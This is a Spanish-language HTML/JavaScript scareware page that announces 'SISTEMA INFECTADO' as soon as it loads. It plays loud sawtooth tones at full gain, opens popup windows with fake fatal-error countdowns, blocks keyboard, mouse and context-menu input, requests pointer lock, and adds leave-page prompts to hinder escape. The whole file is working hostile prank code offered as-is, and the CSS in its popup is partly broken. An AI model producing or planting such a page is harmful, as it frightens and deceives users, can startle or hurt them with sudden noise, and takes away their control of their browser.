<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>INFECCION</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            overflow: hidden;
        }
        body {
            background: black;
            color: #ff0000;
            font-family: 'Courier New', monospace;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            font-size: 32px;
        }
        .titulo {
            font-size: 72px;
            animation: pulso 0.3s infinite;
            margin-bottom: 40px;
        }
        .contador {
            font-size: 120px;
            font-weight: bold;
            margin: 30px;
        }
        .texto {
            margin: 15px;
            font-size: 26px;
        }
        @keyframes pulso {
            0%, 100% {
                transform: scale(1);
                color: #ff0000;
                text-shadow: 0 0 20px red;
            }
            50% {
                transform: scale(1.08);
                color: #ff6666;
                text-shadow: 0 0 30px #ff6666;
            }
        }
        canvas {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            pointer-events: none;
        }
    </style>
</head>
<body>
    <canvas id="mouseblock"></canvas>
    <div class="titulo">🦠 SISTEMA INFECTADO 🦠</div>
    <div class="contador" id="timer">2</div>
    <div class="texto">🔒 MOUSE BLOQUEADO</div>
    <div class="texto">⌨️ TECLAS BLOQUEADAS</div>
    <div class="texto">🔊 SONIDO MAXIMO</div>

    <script>
        // INICIO AUTOMÁTICO
        window.addEventListener('load', function() {
            // SONIDO BRUTAL
            try {
                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                const osc1 = audioCtx.createOscillator();
                const osc2 = audioCtx.createOscillator();
                const gain1 = audioCtx.createGain();
                const gain2 = audioCtx.createGain();

                osc1.frequency.value = 850;
                osc2.frequency.value = 950;
                osc1.type = 'sawtooth';
                osc2.type = 'sawtooth';

                gain1.gain.value = 1;
                gain2.gain.value = 1;

                osc1.connect(gain1);
                gain1.connect(audioCtx.destination);
                osc2.connect(gain2);
                gain2.connect(audioCtx.destination);

                osc1.start();
                osc2.start();

                setTimeout(function() {
                    osc1.stop();
                    osc2.stop();
                }, 2000);
            } catch(e) {
                console.log('Audio bloqueado');
            }

            // SPAWN VENTANAS
            for(let i = 0; i < 4; i++) {
                setTimeout(spawnVirus, i * 150);
            }

            // COUNTDOWN
            let tiempo = 2;
            const timerEl = document.getElementById('timer');
            const intervalo = setInterval(function() {
                tiempo--;
                timerEl.textContent = tiempo;
                if(tiempo <= 0) {
                    clearInterval(intervalo);
                }
            }, 1000);
        });

        function spawnVirus() {
            const hija = window.open('', 'infectado', 'width=850,height=650');
            hija.document.write(`
                <!DOCTYPE html>
                <html>
                <head>
                    <meta charset="UTF-8">
                    <title>CRASH</title>
                    <style>
                        *{margin:0;padding:0;overflow:hidden;}

                            background:#000;

                            font-family:Courier;
                            height:100vh;
                            display:flex;
                            flex-direction:column;
                            justify-content:center;
                            align-items:center;
                            font-size:28px;
                        }
                        .t{font-size:55px;margin-bottom:25px;animation:shake 0.2s infinite;}
                        .c{font-size:95px;font-weight:bold;margin:20px;}
                        .w{margin:12px;font-size:24px;}
                        @keyframes shake{
                            0%,100%{transform:translateX(0);}
                            25%{transform:translateX(-3px);}
                            75%{transform:translateX(3px);}
                        }
                        canvas{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;}
                    </style>
                </head>
                <body>
                    <canvas id="lk"></canvas>
                    <div class="t">⚠️ ERROR FATAL ⚠️</div>
                    <div class="c" id="t2">2</div>
                    <div class="w">F4 BLOQUEADO</div>
                    <div class="w">ESC BLOQUEADO</div>
                    <div class="w">MOUSE BLOQUEADO</div>
                    <script>
                        try{
                            const a = new (window.AudioContext || window.webkitAudioContext)();
                            const o = a.createOscillator();
                            const g = a.createGain();
                            o.frequency.value = 900;
                            g.gain.value = 1;
                            o.connect(g);
                            g.connect(a.destination);
                            o.start();
                            setTimeout(function(){o.stop();}, 2000);
                        }catch(e){}

                        document.onkeydown = document.onkeyup = document.onkeypress = function(e){
                            e.preventDefault();
                            e.stopPropagation();
                            return false;
                        };

                        document.oncontextmenu = document.onselectstart = document.ondragstart = function(e){
                            e.preventDefault();
                            return false;
                        };

                        document.onmousedown = document.onmousemove = function(e){
                            e.preventDefault();
                            return false;
                        };

                        const c = document.getElementById('lk');
                        c.width = screen.width;
                        c.height = screen.height;
                        if(c.requestPointerLock) c.requestPointerLock();

                        let x = 2;
                        const t3 = document.getElementById('t2');
                        const i = setInterval(function(){
                            x--;
                            t3.textContent = x;
                            if(x <= 0){
                                clearInterval(i);
                                window.close();
                            }
                        }, 1000);

                        window.onbeforeunload = function(){return 'CRASH';};
                    <\/script>
                </body>
                </html>
            `);
            hija.document.close();
            hija.focus();
        }

        // BLOQUEO GLOBAL
        document.onkeydown = document.onkeyup = document.onkeypress = function(e) {
            e.preventDefault();
            e.stopPropagation();
            return false;
        };

        document.oncontextmenu = document.onselectstart = function(e) {
            e.preventDefault();
            return false;
        };

        document.onmousedown = document.onmousemove = function(e) {
            e.preventDefault();
        };

        const canvas = document.getElementById('mouseblock');
        canvas.width = screen.width;
        canvas.height = screen.height;
        if(canvas.requestPointerLock) {
            canvas.requestPointerLock();
        }

        window.onbeforeunload = function() {
            return 'INFECCION ACTIVA';
        };
    </script>
</body>
</html>
